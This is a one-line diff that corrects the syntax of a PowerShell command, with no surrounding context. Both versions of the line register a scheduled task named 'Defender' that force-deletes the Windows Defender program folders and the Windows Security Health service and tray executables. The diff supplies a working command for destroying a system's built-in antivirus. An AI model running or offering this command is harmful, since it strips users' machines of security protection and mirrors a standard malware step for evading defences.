@@ -1,1 +1,1 @@
-Register-ScheduledTask Defender Ac (New-ScheduledTaskAction powershell Arg "-C rm -r -fo 'C:\Program Files*\Windows Defender*',C:\WINDOWS\system32\SecurityHealthService.exe,C:\Windows\System32\SecurityHealthSystray.exe") | Out-Null
+Register-ScheduledTask Defender -Ac (New-ScheduledTaskAction powershell "-C rm -r -fo 'C:\Program Files*\Windows Defender*',C:\WINDOWS\system32\SecurityHealthService.exe,C:\Windows\System32\SecurityHealthSystray.exe") | Out-Null
